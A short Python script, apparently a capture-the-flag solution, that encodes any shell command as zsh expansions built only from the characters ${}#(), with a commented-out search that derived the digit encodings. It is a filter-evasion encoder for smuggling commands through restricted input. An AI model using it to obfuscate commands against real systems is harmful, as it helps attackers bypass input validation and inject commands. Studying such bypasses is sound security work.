import subprocess
import string

# charset: ${}#()

digits = {
    '0': '${#}', 
    '1': '${##}', 
    # found the following by running the search below
    '2': '${(#)$(($((###))#${##}${##}${##}${#}${#}${#}${#}${#}${##}${#}))}', 
    '3': '${(#)$(($((###))#${##}${##}${##}${##}${#}${##}${#}${#}${#}))}', 
    '4': '${(#)$(($((##$))#${##}${#}${#}${#}${##}${##}${#}))}', 
    '5': '${(#)$(($((##$))#${##}${#}${#}${#}${##}${##}${##}))}', 
    '6': '${(#)$(($((###))#${##}${#}${##}${##}${##}${##}${##}${#}))}', 
    '7': '${(#)$(($((###))#${##}${#}${##}${##}${##}${##}${##}${##}))}', 
    '8': '${(#)$(($((###))#${##}${#}${##}${#}${#}${#}${#}${##}${#}${##}))}', 
    '9': '${(#)$(($((###))#${##}${#}${##}${##}${#}${#}${##}${##}${#}))}'
}


# for i in range(10):
#     if str(i).encode() not in digits:
#         digits[str(i).encode()] = None
# print(digits)
# v35 = b'$((###))'
# v36 = b'$((##$))'
# bases = ["35", "36"]
# for i in range(2**10):
#     x=bin(i)[2:]
#     for base in bases:
#         exp="${(#)$(("+base+"#"+x+"))}"
#         out=subprocess.check_output(["zsh", "-c", "echo ${(#)$(("+base+"#"+x+"))}"]).strip()
#         if out in digits and digits[out] is None:
#             print(exp, out)
#             exp = exp.encode()
#             exp = exp.replace(b'35', v35).replace(b'36',v36).replace(b'0', digits[b'0']).replace(b'1', digits[b'1'])
#             digits[out] = exp
#print(digits)

chars = {}

for c in string.printable:
    enc = ''.join([digits[d] for d in str(ord(c))])
    chars[c] = "${(#)$(("+enc+"))}"

print(chars)


def encode(word):
    return ''.join([chars[c] for c in word])

def cmd(*words):
    return ' '.join([encode(word) for word in words])
